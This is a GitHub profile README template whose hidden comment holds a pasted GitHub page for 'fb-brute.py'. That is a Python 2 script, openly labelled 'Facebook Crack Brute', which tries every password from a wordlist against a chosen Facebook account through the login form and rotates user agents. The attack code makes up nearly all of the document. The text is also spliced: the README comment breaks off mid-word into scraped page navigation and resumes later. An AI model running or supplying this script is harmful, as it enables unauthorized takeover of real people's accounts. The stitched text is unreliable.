- 👋 Hi, I’m @xariel12
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
xariel12/xariel12 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the PreviSkip to content
lunnar211
/
fb-brute
Public
Code
Issues
8
Pull requests
2
Actions
Projects
Wiki
Security
Insights
fb-brute/fb-brute.py
@lunnar211
lunnar211 Update fb-brute.py
 1 contributor
87 lines (67 sloc)  2.36 KB
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# This Cooding is Coode in python 2 now it willbe renew soon

import sys
import mechanize
import cookielib
import random
#pip2 install mechanize
#pip2 install requests



email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome Hackers
def welcome():
	wel = """
        +=========================================+
        |..........   Facebook Crack Brute   ...........|
        +-----------------------------------------+
        |            #Author: Technical Dipesh          | 
        |	       Version 1.0                      |
 	|   https://www.youtube.com/channel/UCXuKDM3J_GkCxmdki8Hxh4w      |
        +=========================================+
        |..........  fb-brute  ...........|
        +-----------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
Footer
© 2022 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
ew link to take a look at your changes.
--->
